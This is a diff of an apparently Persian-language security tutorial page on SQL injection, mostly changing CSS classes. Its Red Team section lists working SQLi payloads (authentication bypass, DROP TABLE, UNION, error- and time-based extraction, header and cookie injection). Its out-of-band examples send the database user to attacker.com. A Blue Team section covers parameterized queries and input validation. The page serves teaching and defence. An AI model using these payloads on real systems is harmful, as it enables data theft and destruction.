@@ -2,19 +2,21 @@
 import MainLayout from '../layouts/MainLayout.astro';
 ---
 <MainLayout title="SQL Injection (SQLi)">
-<div class="container mx-auto px-4 sm:px-6 lg:px-8 py-6">
-  <h1 class="text-4xl font-bold text-purple-600 mb-4">SQL Injection (SQLi)</h1>
-  <div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
-    <div class="text-lg font-bold text-yellow-400 mb-2" dir="rtl" >SQL Injection چیست؟</div>
-    <ul class="list-disc list-inside text-white" dir="rtl" style="text-align: right;">
+<div class="page-container">
+  <h1 class="page-header">SQL Injection (SQLi)</h1>
+  
+  <div class="content-card">
+    <div class="content-title" dir="rtl">SQL Injection چیست؟</div>
+    <ul class="content-list" dir="rtl">
       <li>تزریق SQL یکی از خطرناک‌ترین و رایج‌ترین آسیب‌پذیری‌های برنامه‌های وب است. این آسیب‌پذیری زمانی رخ می‌دهد که ورودی کاربر بدون اعتبارسنجی مناسب مستقیماً در کوئری‌های SQL قرار می‌گیرد.</li>
       <li>این موضوع به مهاجمان اجازه می‌دهد ساختار کوئری را تغییر دهند و منجر به دسترسی غیرمجاز، افشای داده یا تخریب پایگاه داده شود.</li>
       <li>تزریق SQL می‌تواند رفتار مورد انتظار کوئری را تغییر دهد.</li>
     </ul>
   </div>
-  <div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
-    <div class="text-lg font-bold text-yellow-400 mb-2" dir="rtl" >شدت تأثیر SQLi:</div>
-    <ul class="list-disc list-inside text-white" dir="rtl" style="text-align: right;">
+  
+  <div class="content-card">
+    <div class="content-title" dir="rtl">شدت تأثیر SQLi:</div>
+    <ul class="content-list" dir="rtl">
       <li>دسترسی غیرمجاز به داده‌ها (اطلاعات شخصی، اطلاعات اعتباری، داده‌های حساس)</li>
       <li>تغییر یا حذف پایگاه داده</li>
       <li>دور زدن احراز هویت</li>
@@ -22,229 +24,233 @@ import MainLayout from '../layouts/MainLayout.astro';
       <li>به خطر افتادن کامل سیستم</li>
     </ul>
   </div>
-  <h2 class="text-3xl font-bold text-red-600 mb-6">Red Team Techniques (Offensive)</h2>
-  <div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">1. Basic SQL-Injection Testing</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right;">تزریق SQL کلاسیک زمانی رخ می‌دهد که ورودی کاربر بدون اعتبارسنجی مناسب مستقیماً در کوئری SQL قرار گیرد و مهاجم بتواند ساختار کوئری را تغییر دهد. این موضوع می‌تواند منجر به دسترسی غیرمجاز، افشای داده یا تخریب کامل پایگاه داده شود. این آسیب‌پذیری یکی از قدیمی‌ترین و شناخته‌شده‌ترین آسیب‌پذیری‌های وب است.</p>
-    <div class="font-semibold text-gray-200 mb-1">Common Payloads</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">' OR '1'='1
+</div>
+   <!-- Red Team Techniques Section -->
+  <h2 class="TeamRed-title">Red Team Techniques (Offensive)</h2>
+  
+  <div class="content-card">
+    <div class="content-subtitle-red">1. Basic SQL-Injection Testing</div>
+    <p class="content-text" dir="rtl">تزریق SQL کلاسیک زمانی رخ می‌دهد که ورودی کاربر بدون اعتبارسنجی مناسب مستقیماً در کوئری SQL قرار گیرد و مهاجم بتواند ساختار کوئری را تغییر دهد. این موضوع می‌تواند منجر به دسترسی غیرمجاز، افشای داده یا تخریب کامل پایگاه داده شود. این آسیب‌پذیری یکی از قدیمی‌ترین و شناخته‌شده‌ترین آسیب‌پذیری‌های وب است.</p>
+    
+    <div class="content-label">Common Payloads</div>
+    <pre class="code-block">' OR '1'='1
 " OR "" = "
 ' OR 1=1--
-'; DROP TABLE users--
-</pre>
-    <div class="font-semibold text-gray-200 mb-1">Error-Based Detection</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">' AND 1=CONVERT(int, @@version)--
-' AND 1=CONVERT(int, db_name())--
-</pre>
+'; DROP TABLE users--</pre>
+    
+    <div class="content-label">Error-Based Detection</div>
+    <pre class="code-block">' AND 1=CONVERT(int, @@version)--
+' AND 1=CONVERT(int, db_name())--</pre>
   </div>
-  <div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">2. Union-Based SQL-Injection</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right;">تزریق SQL مبتنی بر UNION از عملگر <span class="font-mono text-red-300">UNION</span> در SQL برای ترکیب نتایج چندین کوئری در یک پاسخ استفاده می‌کند. اگر کوئری اصلی داده‌هایی را نمایش دهد، مهاجم می‌تواند کوئری‌های اضافی را با <span class="font-mono text-red-300">UNION SELECT</span> تزریق کند تا اطلاعات حساس مانند نام کاربری، رمز عبور یا نسخه پایگاه داده را استخراج کند.</p>
-    <div class="font-semibold text-gray-200 mb-1">Column Enumeration</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">ORDER BY 1--
+  
+  <div class="content-card">
+    <div class="content-subtitle-red">2. Union-Based SQL-Injection</div>
+    <p class="content-text" dir="rtl">تزریق SQL مبتنی بر UNION از عملگر <span class="code-inline">UNION</span> در SQL برای ترکیب نتایج چندین کوئری در یک پاسخ استفاده می‌کند. اگر کوئری اصلی داده‌هایی را نمایش دهد، مهاجم می‌تواند کوئری‌های اضافی را با <span class="code-inline">UNION SELECT</span> تزریق کند تا اطلاعات حساس مانند نام کاربری، رمز عبور یا نسخه پایگاه داده را استخراج کند.</p>
+    
+    <div class="content-label">Column Enumeration</div>
+    <pre class="code-block">ORDER BY 1--
 ORDER BY 2--
 ...
-ORDER BY 10--
-</pre>
-    <div class="font-semibold text-gray-200 mb-1">Data Extraction</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">UNION SELECT 1,2,3,4--
+ORDER BY 10--</pre>
+    
+    <div class="content-label">Data Extraction</div>
+    <pre class="code-block">UNION SELECT 1,2,3,4--
 UNION SELECT null,table_name,null FROM information_schema.tables--
-UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
-</pre>
-
+UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--</pre>
   </div>
-
-<!-- Blind SQL-Injection Persian Section -->
-  <div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">3. Blind SQL-Injection</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'B Roya', Tahoma, Arial, sans-serif;">تزریق کور نوعی حمله تزریق SQL است که مهاجم نمی‌تواند خروجی مستقیم payload خود را در صفحه وب مشاهده کند. مهاجم اطلاعات را از رفتار برنامه (مانند تغییرات در محتوای صفحه، زمان‌بندی یا کدهای پاسخ) استخراج می‌کند تا داده‌ها را از پایگاه داده دریافت کند. این روش معمولاً زمانی استفاده می‌شود که پیام‌های خطا یا نتایج کوئری برای مهاجم قابل مشاهده نیست.</p>
-    <div class="font-semibold text-gray-200 mb-1">Boolean-Based</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">AND SUBSTRING((SELECT @@version),1,1)='M'
-AND (SELECT COUNT(*) FROM users) > 10
-    </pre>
-    <div class="font-semibold text-gray-200 mb-1">Time-Based</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">MySQL: AND IF(1=1,SLEEP(5),0)
+  
+  <div class="content-card">
+    <div class="content-subtitle-red">3. Blind SQL-Injection</div>
+    <p class="content-text" dir="rtl">تزریق کور نوعی حمله تزریق SQL است که مهاجم نمی‌تواند خروجی مستقیم payload خود را در صفحه وب مشاهده کند. مهاجم اطلاعات را از رفتار برنامه (مانند تغییرات در محتوای صفحه، زمان‌بندی یا کدهای پاسخ) استخراج می‌کند تا داده‌ها را از پایگاه داده دریافت کند. این روش معمولاً زمانی استفاده می‌شود که پیام‌های خطا یا نتایج کوئری برای مهاجم قابل مشاهده نیست.</p>
+    
+    <div class="content-label">Boolean-Based</div>
+    <pre class="code-block">AND SUBSTRING((SELECT @@version),1,1)='M'
+AND (SELECT COUNT(*) FROM users) > 10</pre>
+    
+    <div class="content-label">Time-Based</div>
+    <pre class="code-block">MySQL: AND IF(1=1,SLEEP(5),0)
 MSSQL: WAITFOR DELAY '0:0:5'
-Oracle: AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
-    </pre>
+Oracle: AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)</pre>
   </div>
   <!-- SQL Injection via HTTP Headers Persian Section -->
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">4. SQL Injection via HTTP Headers</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'B Roya', Tahoma, Arial, sans-serif;">برخی برنامه‌های وب به اشتباه به مقادیر هدرهای HTTP مانند User-Agent، Referer و X-Forwarded-For اعتماد می‌کنند و آن‌ها را بدون اعتبارسنجی مناسب مستقیماً در کوئری‌های SQL قرار می‌دهند که منجر به آسیب‌پذیری تزریق می‌شود.</p>
-    <div class="font-semibold text-gray-200 mb-1">Example: Malicious Header Injection</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">GET /profile HTTP/1.1
+<div class="content-card">
+    <div class="content-subtitle-red">4. SQL Injection via HTTP Headers</div>
+    <p class="content-text" dir="rtl">برخی برنامه‌های وب به اشتباه به مقادیر هدرهای HTTP مانند User-Agent، Referer و X-Forwarded-For اعتماد می‌کنند و آن‌ها را بدون اعتبارسنجی مناسب مستقیماً در کوئری‌های SQL قرار می‌دهند که منجر به آسیب‌پذیری تزریق می‌شود.</p>
+    
+    <div class="content-label">Example: Malicious Header Injection</div>
+    <pre class="code-block">GET /profile HTTP/1.1
 Host: vulnerable.com
-User-Agent: ' OR 1=1--
-    </pre>
-    <div class="font-semibold text-gray-200 mb-1">Sample Payloads in Headers</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--
-Referer: ' UNION SELECT username, password FROM users--
-    </pre>
-  </div>
-  <!-- SQL Injection via Cookies Section -->
-  <div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">5. SQL Injection via Cookies</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">کوکی‌ها داده‌هایی هستند که توسط کاربر کنترل می‌شوند و همراه درخواست‌ها ارسال می‌شوند. اگر یک برنامه وب مقادیر کوکی را بدون اعتبارسنجی مناسب مستقیماً در کوئری‌های SQL استفاده کند، مهاجمان می‌توانند با تزریق SQL مخرب، پایگاه داده را مورد سوءاستفاده قرار دهند.</p>
-    <div class="font-semibold text-gray-200 mb-1">Example: Malicious Cookie Injection
+User-Agent: ' OR 1=1--</pre>
+    
+    <div class="content-label">Sample Payloads in Headers</div>
+    <pre class="code-block">X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--
+Referer: ' UNION SELECT username, password FROM users--</pre>
 </div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">Cookie: sessionId=xyz' OR '1'='1
-</pre>
-    <div class="font-semibold text-gray-200 mb-1">Sample Payloads in Cookies
-</div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">Cookie: authToken=abc' OR 'x'='x
-Cookie: userPref=1'; DROP TABLE users--
-</pre>
-  </div>
 
-  <!-- Error-Based SQL Injection Section -->
-  <div class="bg-slate-800 rounded-xl p-6 mb-6">
-    <div class="text-xl font-bold text-red-400 mb-2">6. Error-Based SQL Injection</div>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">تزریق SQL مبتنی بر خطا از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند. مهاجمان به طور عمدی باعث ایجاد خطاهایی در پایگاه داده می‌شوند که جزئیات ارزشمندی مانند نام جدول‌ها، نام ستون‌ها یا حتی داده‌ها را نمایش می‌دهد.</p>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">نحوه عملکرد</p>
-    <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">با تزریق سینتکس اشتباه SQL یا استفاده از توابع خاص پایگاه داده که باعث خطا می‌شوند، مهاجمان می‌توانند پاسخ‌های خطای پایگاه داده را مستقیماً در خروجی برنامه وب مشاهده کنند اگر مدیریت خطا کافی نباشد.</p>
-    <div class="font-semibold text-gray-200 mb-1">Example: Forcing an Error to Leak Data
+<!-- SQL Injection via Cookies Section -->
+<div class="content-card">
+    <div class="content-subtitle-red">5. SQL Injection via Cookies</div>
+    <p class="content-text" dir="rtl">کوکی‌ها داده‌هایی هستند که توسط کاربر کنترل می‌شوند و همراه درخواست‌ها ارسال می‌شوند. اگر یک برنامه وب مقادیر کوکی را بدون اعتبارسنجی مناسب مستقیماً در کوئری‌های SQL استفاده کند، مهاجمان می‌توانند با تزریق SQL مخرب، پایگاه داده را مورد سوءاستفاده قرار دهند.</p>
+    
+    <div class="content-label">Example: Malicious Cookie Injection</div>
+    <pre class="code-block">Cookie: sessionId=xyz' OR '1'='1</pre>
+    
+    <div class="content-label">Sample Payloads in Cookies</div>
+    <pre class="code-block">Cookie: authToken=abc' OR 'x'='x
+Cookie: userPref=1'; DROP TABLE users--</pre>
 </div>
-    <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap" dir="ltr">http://example.com/page.php?id=1' AND updatexml(null, concat(0x7e, (SELECT user())), null)--
-</pre>
-    <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
-    این فایل مخرب از تابع updatexml() در MySQL برای ایجاد خطای تجزیه XML استفاده می‌کند که منجر به نشت اطلاعات کاربر پایگاه داده می‌شود.
-  </div>
-    <div class="font-semibold text-gray-200 mb-1">Common Error-Based Payloads</div>
-<pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
+
+<!-- Error-Based SQL Injection Section -->
+<div class="content-card">
+    <div class="content-subtitle-red">6. Error-Based SQL Injection</div>
+    <p class="content-text" dir="rtl">تزریق SQL مبتنی بر خطا از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند. مهاجمان به طور عمدی باعث ایجاد خطاهایی در پایگاه داده می‌شوند که جزئیات ارزشمندی مانند نام جدول‌ها، نام ستون‌ها یا حتی داده‌ها را نمایش می‌دهد.</p>
+    
+    <p class="content-text" dir="rtl">نحوه عملکرد</p>
+    <p class="content-text" dir="rtl">با تزریق سینتکس اشتباه SQL یا استفاده از توابع خاص پایگاه داده که باعث خطا می‌شوند، مهاجمان می‌توانند پاسخ‌های خطای پایگاه داده را مستقیماً در خروجی برنامه وب مشاهده کنند اگر مدیریت خطا کافی نباشد.</p>
+    
+    <div class="content-label">Example: Forcing an Error to Leak Data</div>
+    <pre class="code-block">http://example.com/page.php?id=1' AND updatexml(null, concat(0x7e, (SELECT user())), null)--</pre>
+    
+    <div class="content-note" dir="rtl">این فایل مخرب از تابع updatexml() در MySQL برای ایجاد خطای تجزیه XML استفاده می‌کند که منجر به نشت اطلاعات کاربر پایگاه داده می‌شود.</div>
+    
+    <div class="content-label">Common Error-Based Payloads</div>
+    <pre class="code-block">' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
 ' AND updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)--
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
-</pre>
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--</pre>
 </div>
-  <!-- Time-Based Blind SQL Injection Section -->
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-  <div class="text-xl font-bold text-red-400 mb-2">7. Time-Based Blind SQL Injection</div>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+<!-- Time-Based Blind SQL Injection Section -->
+<div class="content-card">
+  <div class="content-subtitle-red">7. Time-Based Blind SQL Injection</div>
+  <p class="content-text" dir="rtl">
     تزریق کور مبتنی بر زمان زمانی استفاده می‌شود که برنامه وب پیام خطا یا داده را مستقیماً باز نمی‌گرداند، اما مهاجم می‌تواند با مشاهده تأخیر در پاسخ برنامه، اطلاعات را استنتاج کند. این تأخیرها با کوئری‌های خاص SQL ایجاد می‌شوند.
   </p>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">نحوه عملکرد</p>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  <p class="content-text" dir="rtl">نحوه عملکرد</p>
+  <p class="content-text" dir="rtl">
     مهاجم SQL را تزریق می‌کند که باعث می‌شود پایگاه داده در صورت صحت یک شرط، برای مدت مشخصی متوقف شود (sleep). با اندازه‌گیری زمان پاسخ سرور، مهاجم می‌تواند صحت شرط را تشخیص دهد و داده‌ها را به صورت تدریجی استخراج کند.
   </p>
-  <div class="font-semibold text-gray-200 mb-1">Common Time-Based Payloads</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
--- MySQL
+  
+  <div class="content-label">Common Time-Based Payloads</div>
+  <pre class="code-block">-- MySQL
 ?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)
 
 -- Microsoft SQL Server
 ?id=1; IF (SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '00:00:05'--
 
 -- Oracle
-?id=1 AND 1=(CASE WHEN (SUBSTR((SELECT user FROM dual),1,1)='A') THEN TO_CHAR(DBMS_LOCK.SLEEP(5)) END)
-  </pre>
-  <div class="font-semibold text-gray-200 mb-1">Example</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-http://example.com/item?id=1 AND IF(SUBSTRING((SELECT user()),1,1)='r', SLEEP(5), 0)--
-  </pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+?id=1 AND 1=(CASE WHEN (SUBSTR((SELECT user FROM dual),1,1)='A') THEN TO_CHAR(DBMS_LOCK.SLEEP(5)) END)</pre>
+  
+  <div class="content-label">Example</div>
+  <pre class="code-block">http://example.com/item?id=1 AND IF(SUBSTRING((SELECT user()),1,1)='r', SLEEP(5), 0)--</pre>
+  
+  <div class="content-note" dir="rtl">
     این پیلود بررسی می‌کند که آیا اولین کاراکتر نام کاربری پایگاه داده "r" است یا خیر. اگر درست باشد، سرور به مدت ۵ ثانیه متوقف می‌شود که نشان‌دهنده نتیجه مثبت است.
   </div>
 </div>
 <!-- Out-of-Band (OOB) SQL Injection Section -->
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-  <div class="text-xl font-bold text-red-400 mb-2">8. Out-of-Band (OOB) SQL Injection</div>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+<div class="content-card">
+  <div class="content-subtitle-red">8. Out-of-Band (OOB) SQL Injection</div>
+  <p class="content-text" dir="rtl">
     تزریق SQL خارج از باند زمانی رخ می‌دهد که مهاجمان از قابلیت پایگاه داده برای ارسال درخواست‌های شبکه به سرورهای خارجی جهت استخراج داده یا تعامل با سیستم‌های خارجی استفاده می‌کنند. این روش زمانی مفید است که برنامه وب داده یا خطا را مستقیماً باز نمی‌گرداند.
   </p>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">نحوه عملکرد</p>
-  <p class="text-white mb-4" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  <p class="content-text" dir="rtl">نحوه عملکرد</p>
+  <p class="content-text" dir="rtl">
     مهاجم پیلودهایی را تزریق می‌کند که باعث می‌شود پایگاه داده درخواست‌های DNS یا HTTP به سرور تحت کنترل مهاجم ارسال کند. با مانیتور کردن این درخواست‌ها، مهاجم می‌تواند اطلاعاتی مانند نام پایگاه داده، اطلاعات کاربری یا داده‌های حساس دیگر را استخراج کند.
   </p>
-  <div class="font-semibold text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">تکنیک‌های رایج خارج از باند</div>
-  <ul class="list-disc list-inside text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  
+  <div class="content-label" dir="rtl">تکنیک‌های رایج خارج از باند</div>
+  <ul class="content-list" dir="rtl">
     <li><span class="font-bold">استخراج DNS:</span> استفاده از توابع پایگاه داده برای ایجاد درخواست‌های DNS که داده‌ها را در زیردامنه‌ها رمزگذاری می‌کند.</li>
-    <li><span class="font-bold">درخواست HTTP:</span> ارسال درخواست HTTP به سرور مهاجم با استفاده از توابعی مانند <span class="font-mono">xp_dirtree</span> در MSSQL یا <span class="font-mono">UTL_HTTP.REQUEST</span> در Oracle.</li>
+    <li><span class="font-bold">درخواست HTTP:</span> ارسال درخواست HTTP به سرور مهاجم با استفاده از توابعی مانند <span class="code-inline">xp_dirtree</span> در MSSQL یا <span class="code-inline">UTL_HTTP.REQUEST</span> در Oracle.</li>
   </ul>
-  <div class="font-semibold text-gray-200 mb-1">Example: MSSQL DNS Lookup</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-{"'; EXEC master..xp_dirtree '\\\\attacker.com${user}'--"}
-</pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  
+  <div class="content-label">Example: MSSQL DNS Lookup</div>
+  <pre class="code-block">{"'; EXEC master..xp_dirtree '\\\\attacker.com${user}'--"}</pre>
+  <div class="content-note" dir="rtl">
     این پیلود باعث می‌شود سرور پایگاه داده یک درخواست DNS به دامنه مهاجم ارسال کند و نام کاربری پایگاه داده را به صورت خارجی افشا کند.
   </div>
-  <div class="font-semibold text-gray-200 mb-1">Example: Oracle HTTP Request</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-'; BEGIN
+  
+  <div class="content-label">Example: Oracle HTTP Request</div>
+  <pre class="code-block">'; BEGIN
 UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual));
-END;--
-  </pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+END;--</pre>
+  <div class="content-note" dir="rtl">
     این پیلود باعث ارسال درخواست HTTP به سرور مهاجم همراه با نام کاربری فعلی پایگاه داده می‌شود.
   </div>
 </div>
+
 <!-- SQL Injection Tools & Automation Section -->
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-  <div class="font-semibold text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">ابزارها و اتوماسیون تزریق SQL</div>
-  <div class="font-semibold text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">کشف و اسکن</div>
-  <ul class="list-disc list-inside text-red-200" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+<div class="content-card">
+  <div class="content-subtitle-red" dir="rtl">ابزارها و اتوماسیون تزریق SQL</div>
+  
+  <div class="content-label" dir="rtl">کشف و اسکن</div>
+  <ul class="content-list" dir="rtl">
     <li>sqlmap – ابزار خودکار تزریق SQL و تصاحب پایگاه داده</li>
     <li>Burp Suite Scanner – اسکن فعال و شناسایی SQLi</li>
     <li>sqlninja – ابزار بهره‌برداری برای تزریق MSSQL</li>
     <li>Havij – ابزار خودکار و کاربرپسند تزریق SQL</li>
     <li>jSQL Injection – ابزار سبک تشخیص و بهره‌برداری SQLi</li>
   </ul>
-  <div class="font-semibold text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">بهره‌برداری و تولید پیلود</div>
-  <ul class="list-disc list-inside text-red-200" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  
+  <div class="content-label" dir="rtl">بهره‌برداری و تولید پیلود</div>
+  <ul class="content-list" dir="rtl">
     <li>sqlmap – تولید و بهره‌برداری خودکار پیلود</li>
     <li>sqlninja – بهره‌برداری هدفمند برای MSSQL</li>
     <li>Havij – استخراج و تولید پیلود خودکار</li>
     <li>ساخت دستی پیلود با ابزارهایی مانند Burp Repeater</li>
   </ul>
-  <div class="font-semibold text-gray-200 mb-1" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">پس از بهره‌برداری و گزارش‌گیری</div>
-  <ul class="list-disc list-inside text-red-200" dir="rtl" style="text-align: right; font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;">
+  
+  <div class="content-label" dir="rtl">پس از بهره‌برداری و گزارش‌گیری</div>
+  <ul class="content-list" dir="rtl">
     <li>sqlmap – تصاحب پایگاه داده، دسترسی به فایل سیستم، اجرای فرمان</li>
     <li>Burp Suite Intruder – fuzzing سفارشی پیلود</li>
     <li>گزارش‌گیری و خروجی‌گیری خودکار یافته‌ها</li>
   </ul>
 </div>
  <!-- Blue Team Defenses (Defensive) Section -->
-<h2 class="text-3xl font-bold text-blue-500 mb-6">Blue Team Defenses (Defensive)</h2>
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-  <div class="text-xl font-bold text-blue-400 mb-2">1. Secure Coding</div>
-  <div class="font-semibold text-gray-200 mb-1">Parameterized Queries</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-// Python with psycopg2
+<h2 class="TeamBlue-title">Blue Team Defenses (Defensive)</h2>
+<!-- Secure Coding Section -->
+<div class="content-card">
+  <div class="content-subtitle-blue">1. Secure Coding</div>
+  
+  <div class="content-label">Parameterized Queries</div>
+  <pre class="code-block">// Python with psycopg2
 cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
 
 // Java with PreparedStatement
 PreparedStatement stmt = conn.prepareStatement(
   "SELECT * FROM users WHERE username = ?"
 );
-stmt.setString(1, username);
-  </pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right;">
+stmt.setString(1, username);</pre>
+  
+  <div class="content-note" dir="rtl">
     استفاده از کوئری‌های پارامتری در زبان‌های برنامه‌نویسی مانند پایتون و جاوا باعث جلوگیری از تزریق SQL می‌شود. مقادیر ورودی کاربر به صورت امن جایگزین پارامترها می‌شوند و ساختار کوئری تغییر نمی‌کند.
   </div>
-  <div class="font-semibold text-gray-200 mb-1">ORM Best Practices</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-{"# Django ORM (safe)\nUser.objects.raw('SELECT * FROM users WHERE username = %s', [username])\n\n# Never do this (vulnerable)\nUser.objects.raw(f\"SELECT * FROM users WHERE username = '{username}'\")"}
-</pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right;">
+  
+  <div class="content-label">ORM Best Practices</div>
+  <pre class="code-block">{"# Django ORM (safe)\nUser.objects.raw('SELECT * FROM users WHERE username = %s', [username])\n\n# Never do this (vulnerable)\nUser.objects.raw(f\"SELECT * FROM users WHERE username = '{username}'\")"}</pre>
+  
+  <div class="content-note" dir="rtl">
     استفاده صحیح از ORMها مانند Django باعث جلوگیری از تزریق SQL می‌شود. هرگز مقادیر ورودی را مستقیماً در کوئری قرار ندهید.
   </div>
 </div>
-<div class="bg-slate-800 rounded-xl p-6 mb-6">
-  <div class="text-xl font-bold text-blue-400 mb-2">2. Input Validation</div>
-  <div class="font-semibold text-gray-200 mb-1">Whitelisting</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-{"// Only allow alphanumeric for usernames\nif (!username.matches(\"^[a-zA-Z0-9]+$\")) {\n  throw new ValidationException(\"Invalid username\");\n}"}
-</pre>
 
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right;">
+<!-- Input Validation Section -->
+<div class="content-card">
+  <div class="content-subtitle-blue">2. Input Validation</div>
+  
+  <div class="content-label">Whitelisting</div>
+  <pre class="code-block"><code>{"// Only allow alphanumeric for usernames\nif (!username.matches(\"^[a-zA-Z0-9]+$\")) {\n  throw new ValidationException(\"Invalid username\");\n}"}</pre>
+  
+  <div class="content-note" dir="rtl">
     اعتبارسنجی ورودی‌ها با لیست سفید (مانند فقط حروف و اعداد) از ورود داده‌های مخرب جلوگیری می‌کند.
   </div>
